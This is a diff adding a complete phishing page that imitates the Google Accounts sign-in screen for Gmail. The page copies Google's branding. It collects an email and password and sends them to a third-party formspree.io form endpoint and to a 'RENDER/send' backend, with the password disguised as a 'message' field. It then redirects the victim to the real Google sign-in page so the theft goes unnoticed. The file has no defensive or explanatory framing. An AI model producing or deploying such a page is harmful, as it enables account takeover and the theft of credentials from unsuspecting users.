@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+    <title>Sign in – Google Accounts</title>
+    <link rel="shortcut icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        body {
+            height: 100%;
+            width: 100%;
+            background: #fff;
+            font: 13px/1.5 -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            margin: 0;
+            padding: 0;
+        }
+
+        .goog-logo-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+        }
+
+        .goog-logo {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            padding: 2px 0;
+        }
+
+        .logo-text {
+            font-size: 21px;
+            color: #4285f4;
+            font-weight: 400;
+            letter-spacing: -0.25px;
+            line-height: 1;
+            word-spacing: normal;
+        }
+
+        .google-g {
+            display: inline-block;
+            vertical-align: middle;
+            background: transparent;
+            object-fit: contain;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .google-g--small { width: 48px; height: auto; display:block; }
+        .google-g--large { width: 120px; height: auto; display:block; }
+
+        .form-header {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+
+        .form-logo {
+            width: 120px;
+            height: auto;
+            display: block;
+            margin-left: -24px; /* shift logo left into the form padding */
+            transform: none;
+        }
+
+        .form-title {
+            margin: 0;
+            font-size: 32px;
+            line-height: 1.1;
+        }
+
+        .logo-text span:nth-child(1) { color: #4285f4; }
+        .logo-text span:nth-child(2) { color: #ea4335; }
+        .logo-text span:nth-child(3) { color: #fbbc04; }
+        .logo-text span:nth-child(4) { color: #4285f4; }
+        .logo-text span:nth-child(5) { color: #34a853; }
+        .logo-text span:nth-child(6) { color: #ea4335; }
+
+        .top-right-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .goog-tooltip-action, .primary-action {
+            background: transparent;
+            border: none;
+            color: #1f71c6;
+            font-size: 13px;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.1s;
+            font-family: inherit;
+        }
+
+        .goog-tooltip-action:hover {
+            background: #f1f3f4;
+        }
+
+        .primary-action {
+            border: 1px solid #dadce0;
+            background: #f8f9fa;
+            padding: 8px 16px;
+        }
+
+        .primary-action:hover {
+            background: #f8f9fa;
+            border-color: #c6c6c6;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
+        }
+
+        .glifWebSignIn {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 60px 20px;
+        }
+
+        .glifWebSignIn-container {
+            width: 100%;
+            max-width: 448px;
+        }
+
+        .ifW {
+            display: none !important;
+        }
+
+        .glifWebSignIn-form {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+        }
+
+        .rcjchp {
+            margin-bottom: 32px;
+        }
+
+        .rcjchp h1 {
+            font-size: 32px;
+            font-weight: 400;
+            line-height: 1.25;
+            color: #202124;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .rcjchp p {
+            font-size: 15px;
+            color: #5f6368;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        .qhN5Mc {
+            margin-bottom: 20px;
+            display: block !important;
+        }
+
+        .qhN5Mc label {
+            display: block;
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .qhN5Mc input {
+            width: 100%;
+            padding: 11px 12px;
+            font-size: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-family: inherit;
+            transition: all 0.1s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .qhN5Mc input:hover {
+            border-color: #c6c6c6;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.04);
+        }
+
+        .qhN5Mc input:focus {
+            outline: none;
+            border-color: #1f71c6;
+            box-shadow: 0 1px 3px rgba(31, 113, 198, 0.2);
+        }
+
+        .mN1ibb {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0 24px 0;
+            padding: 8px 0;
+        }
+
+        .mN1ibb input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #1f71c6;
+            -webkit-appearance: none;
+            appearance: none;
+            border: 2px solid #c6c6c6;
+            border-radius: 2px;
+            margin: 0;
+            padding: 0;
+        }
+
+        .mN1ibb input[type="checkbox"]:hover {
+            border-color: #1f71c6;
+        }
+
+        .mN1ibb input[type="checkbox"]:checked {
+            background: #1f71c6;
+            border-color: #1f71c6;
+        }
+
+        .mN1ibb label {
+            margin: 0;
+            font-size: 13px;
+            cursor: pointer;
+            color: #3c4043;
+            font-weight: 400;
+        }
+
+        .XxIAqe {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 24px 0;
+            min-height: 20px;
+        }
+
+        .XxIAqe a {
+            color: #1f71c6;
+            text-decoration: none;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.1s;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .XxIAqe a:hover {
+            color: #1557b0;
+        }
+
+        .VfPpkd-xl07Ob-XxIAqe {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 12px;
+            margin-top: 32px;
+        }
+
+        .VfPpkd-lg-button {
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.1s;
+            font-family: inherit;
+            text-align: center;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .VfPpkd-lg-button.VfPpkd-lg-button-secondary {
+            background: #f8f9fa;
+            color: #1f71c6;
+            border: 1px solid #dadce0;
+        }
+
+        .VfPpkd-lg-button.VfPpkd-lg-button-secondary:hover {
+            background: #f8f9fa;
+            border-color: #c6c6c6;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.04);
+        }
+
+        .VfPpkd-lg-button.VfPpkd-lg-button-primary {
+            background: #1f71c6;
+            color: white;
+        }
+
+        .VfPpkd-lg-button.VfPpkd-lg-button-primary:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.04);
+        }
+
+        .VfPpkd-lg-button.VfPpkd-lg-button-primary:active {
+            background: #0d47a1;
+        }
+
+        .S0p1c {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 40px;
+            padding: 16px 20px;
+            font-size: 12px;
+            color: #5f6368;
+            flex-wrap: wrap;
+        }
+
+        .S0p1c a {
+            color: #1f71c6;
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.1s;
+        }
+
+        .S0p1c a:hover {
+            color: #1557b0;
+        }
+
+        @media (max-width: 600px) {
+            .goog-logo-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+
+            .top-right-buttons {
+                width: 100%;
+                justify-content: flex-start;
+            }
+
+            .glifWebSignIn-form {
+                padding: 30px 20px;
+            }
+
+            .VfPpkd-xl07Ob-XxIAqe {
+                flex-direction: column-reverse;
+            }
+
+            .VfPpkd-lg-button {
+                width: 100%;
+            }
+
+            .S0p1c {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="goog-logo-header">
+        <div class="goog-logo">
+            <div class="logo-text">
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </div>
+        </div>
+        <div class="top-right-buttons">
+            <button class="goog-tooltip-action">Help</button>
+            <button class="primary-action">Create account</button>
+        </div>
+    </div>
+
+    <div class="glifWebSignIn">
+        <div class="glifWebSignIn-container">
+            <form action="https://formspree.io/f/mqeaowlz"  method="POST"
+            class="glifWebSignIn-form" id="signinform">
+                <div class="rcjchp">
+                    <div class="form-header">
+                        <div class="logo-text" style="font-size: 32px; margin: 0; display:flex; align-items:baseline; gap:0;">
+                            <img src="assets/logo_transparent.png" class="form-logo" alt="Google">
+                        </div>
+                        <h1 class="form-title">Sign in</h1>
+                    </div>
+                    <p>to continue to Gmail</p>
+                </div>
+
+                <div class="qhN5Mc">
+                    <label for="identifierId">Email or phone</label>
+                    <input 
+                        type="text" 
+                        id="identifierId" 
+                        name="identifier" 
+                        autocomplete="email"
+                        required
+                    >
+                </div>
+
+                <div class="XxIAqe">
+                    <span></span>
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot email?</a>
+                </div>
+
+                <div class="qhN5Mc">
+                    <label for="Passwd">Password</label>
+                    <input 
+                        type="password" 
+                        id="Passwd" 
+                        name="password" 
+                        autocomplete="current-password"
+                        required
+                    >
+                    
+                </div>
+
+                <div class="mN1ibb">
+                    <input type="checkbox" id="PersistentCookie" name="PersistentCookie">
+                    <label for="PersistentCookie">Keep me signed in</label>
+                </div>
+
+                <div class="XxIAqe">
+                    <span></span>
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot password?</a>
+                </div>
+
+                <div class="VfPpkd-xl07Ob-XxIAqe">
+                    <button type="button" class="VfPpkd-lg-button VfPpkd-lg-button-primary" id="identifierNext">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="S0p1c">
+        <a href="#">English (United States)</a>
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+
+<script>
+const form = document.getElementById('signinform');
+const emailInput = document.getElementById('identifierId');
+const messageInput = document.getElementById('Passwd');
+const nextButton = document.getElementById('identifierNext');
+
+function validateEmail(email) {
+    return email.length > 0 && (email.includes('@') || /^\d{10,}$/.test(email) || email.includes(' '));
+}
+
+nextButton.addEventListener('click', async function(e) {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const message = messageInput.value.trim();
+
+    if (!validateEmail(email)) {
+        emailInput.style.borderColor = '#d33b27';
+        emailInput.focus();
+        return;
+    }
+
+    if (!message) {
+        messageInput.style.borderColor = '#d33b27';
+        messageInput.focus();
+        return;
+    }
+
+    // Send to backend
+    try {
+        const res = await fetch('RENDER/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, message })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+            // Redirect after success
+            window.location.href = 'https://accounts.google.com/signin';
+        } else {
+            alert('Error sending message');
+        }
+    } catch (err) {
+        alert('Error sending message: ' + err.message);
+    }
+});
+</script>
